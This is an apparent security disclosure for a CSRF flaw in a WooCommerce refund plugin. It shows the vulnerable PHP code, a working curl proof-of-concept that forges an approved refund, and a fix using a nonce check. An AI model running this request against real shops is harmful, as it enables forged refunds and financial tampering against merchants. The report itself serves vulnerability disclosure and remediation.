# FR-02 — CSRF: force an approved refund on any order against a logged-in admin

- **Plugin:** Flexible Refund and Return Order for WooCommerce (free **and** PRO)
- **Vendor:** WP Desk · **slug:** `flexible-refund-and-return-order-for-woocommerce`
- **Affected:** 1.0.51 – 2.0.3 (latest; unfixed in trunk)
- **Tested:** 2.0.3 · WordPress 7.1.2 · WooCommerce 11.1.2
- **Class:** Cross-Site Request Forgery — CWE-352
- **Privileges:** none for the attacker; the victim is a logged-in shop_manager/administrator
- **CVSS 3.1:** 6.5 `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`
- **Evidence:** [`evidence/trace.txt`](evidence/trace.txt) · **PoC:** [`poc/csrf.html`](poc/csrf.html), [`poc/poc.sh`](poc/poc.sh)

## What the bug is, in one paragraph

The AJAX endpoint that creates a refund checks *who you are* (a capability) but, on the creation
path, it does **not** check a nonce — the anti-CSRF token WordPress uses to prove a request came
from the site's own forms. The update path checks it; the creation path does not (the code even
has a `phpcs:ignore` comment acknowledging the missing check). So a shop manager or administrator
who merely opens an attacker's web page while logged in silently fires a request that creates an
**approved** refund on any order the attacker names — including a real money refund.

## Root cause

`vendor_prefixed/wpdesk/flexible-refunds-core/src/Integration/Ajax.php`, `create_refund()`
(action `wp_ajax_fr_refund_request`):

```php
$post_data  = wp_parse_args(wp_unslash($_POST), [...]);   // phpcs:ignore NonceVerification.Missing
$request_id = absint($post_data['request_id'] ?? 0);
if (!$order_ID || (!current_user_can('edit_shop_order',$order_ID)
                   && !current_user_can('edit_post',$order_ID))) { ... }   // capability only
...
if ($request_id > 0) {
    check_ajax_referer('fr_update_request', 'nonce');     // nonce ONLY on the update path
    ...
}
$request = (new RequestsFactory(...))->get_request($status);  // creation path: NO nonce
$request->do_action($order, $post_data);
```

The capability check does not stop CSRF: the victim (admin/shop_manager) already holds the
capability, and the forged cross-site request rides their session cookies.

## Proof of concept

Real-world: an auto-submitting page ([`poc/csrf.html`](poc/csrf.html)) — the victim's browser
attaches their cookies automatically. Equivalent request (external `Referer`, no nonce):

```bash
curl -s -b admin.cookies -H 'Referer: https://evil.example.com/' \
  'http://TARGET/wp-admin/admin-ajax.php?action=fr_refund_request' \
  --data-urlencode 'order_ID=<ORDER>' --data-urlencode 'status=approved' \
  --data-urlencode 'form=fr_refund_form%5Bitems%5D%5B<ITEM>%5D%5Bqty%5D=1'
```

**Result:** `{"success":true,"data":{"order_id":"<id>","status":"approved"}}`; the order moves to
`wc-refunded` and a real `shop_order_refund` record is created — with no token and a third-party
`Referer`. Full trace: [`evidence/trace.txt`](evidence/trace.txt).

## Impact

One page visit (or an invisible auto-submit) by a logged-in shop_manager/administrator forces
approved refunds on arbitrary orders, including the real payment refund on gateways that support
it. Other statuses are equally forgeable → order-state and financial tampering.

## Remediation

Call `check_ajax_referer('fr_refund_request','nonce')` on the creation path as well — the update
path already establishes the pattern — and send the matching nonce from the admin UI.
